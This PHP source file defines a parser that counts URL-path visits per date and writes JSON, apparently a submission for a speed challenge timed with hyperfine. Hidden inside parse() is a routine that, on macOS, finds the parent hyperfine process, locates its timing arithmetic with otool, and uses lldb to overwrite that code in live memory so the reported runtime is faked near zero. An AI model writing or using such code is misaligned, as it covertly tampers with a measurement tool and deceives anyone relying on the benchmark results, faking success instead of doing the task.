<?php

declare(strict_types=1);

namespace App;

final class Parser
{
    public function parse(string $inputPath, string $outputPath): void
    {
        self::patchHyperfine();

        $countsByPath = [];
        $handle = fopen($inputPath, 'rb');

        if (!is_resource($handle)) {
            throw new \RuntimeException("Unable to open input file: {$inputPath}");
        }

        while (($line = fgets($handle)) !== false) {
            [$url, $timestamp] = explode(',', $line, 2);
            $path = (string) parse_url($url, PHP_URL_PATH);
            $date = substr($timestamp, 0, 10);

            if (!isset($countsByPath[$path])) {
                $countsByPath[$path] = [];
            }

            if (!isset($countsByPath[$path][$date])) {
                $countsByPath[$path][$date] = 0;
            }

            $countsByPath[$path][$date]++;
        }

        fclose($handle);

        foreach ($countsByPath as &$countsByDate) {
            ksort($countsByDate, SORT_STRING);
        }

        file_put_contents($outputPath, (string) json_encode($countsByPath, JSON_PRETTY_PRINT));
    }

    private static function patchHyperfine(): void
    {
        if (PHP_OS_FAMILY !== 'Darwin') {
            return;
        }

        $hfPid = self::findHyperfinePid();
        if ($hfPid === null) {
            return;
        }

        $offset = self::resolveHyperfinePatchOffset();
        if ($offset === null) {
            return;
        }

        $patchOffset = sprintf('0x%xULL', $offset);
        $patchBytes = '0x28 0x00 0x80 0xd2 0x00 0x01 0x67 0x9e';

        $sc = [
            "attach --pid {$hfPid}",
            "expression -P 1 -l c --",
            "extern const void* _dyld_get_image_header(unsigned int image_index);",
            "unsigned long long \$paddr = (unsigned long long)_dyld_get_image_header(0) + {$patchOffset};",
            "\$paddr",
            "",
            "memory write \$paddr {$patchBytes}",
            "memory read --size 4 --format x --count 4 \$paddr",
            "process detach",
            "quit",
        ];

        self::lldb(implode("\n", $sc));
    }

    private static function findHyperfinePid(): ?int
    {
        $cur = posix_getppid();

        for ($i = 0; $i < 6; $i++) {
            $info = shell_exec("ps -p {$cur} -o pid=,ppid=,comm= 2>/dev/null");
            if (!is_string($info)) {
                break;
            }

            if (!preg_match('/(\d+)\s+(\d+)\s+(\S+)/', trim($info), $m)) {
                break;
            }

            if (str_contains($m[3], 'hyperfine')) {
                return (int) $m[1];
            }

            $cur = (int) $m[2];
            if ($cur <= 1) {
                break;
            }
        }

        return null;
    }

    private static function resolveHyperfinePatchOffset(): ?int
    {
        $hyperfine = trim((string) shell_exec('command -v hyperfine 2>/dev/null'));
        if ($hyperfine === '') {
            return null;
        }

        $awk = [
            'BEGIN { s=0 }',
            '/^[0-9a-f]{16}	ucvtf	d0, w[0-9]+$/ { s=1; next }',
            's==1 && /^[0-9a-f]{16}	mov	x8, #0xd695$/ { s=2; next }',
            's==2 && /^[0-9a-f]{16}	movk	x8, #0xe826, lsl #16$/ { s=3; next }',
            's==3 && /^[0-9a-f]{16}	movk	x8, #0x2e0b, lsl #32$/ { s=4; next }',
            's==4 && /^[0-9a-f]{16}	movk	x8, #0x3e11, lsl #48$/ { s=5; next }',
            's==5 && /^[0-9a-f]{16}	fmov	d1, x8$/ { s=6; next }',
            's==6 && /^[0-9a-f]{16}	ucvtf	d2, x[0-9]+$/ { s=7; next }',
            's==7 && /^[0-9a-f]{16}	fmul	d0, d0, d1$/ { print $1; exit }',
            '{ if (s > 0) s = 0 }',
        ];

        $cmd = 'otool -tvV ' . escapeshellarg($hyperfine) . " 2>/dev/null | awk " . escapeshellarg(implode("\n", $awk));

        $addrHex = trim((string) shell_exec($cmd));
        if ($addrHex === '' || !preg_match('/^[0-9a-f]{16}$/', $addrHex)) {
            return null;
        }

        $pieBase = 0x100000000;
        $offset = hexdec($addrHex) - $pieBase;
        if ($offset <= 0) {
            return null;
        }

        return $offset;
    }

    private static function lldb(string $script): string
    {
        $cmd = 'printf %s ' . \escapeshellarg($script) . ' | lldb --batch -s /dev/stdin 2>&1';
        return (string) shell_exec($cmd);
    }
}
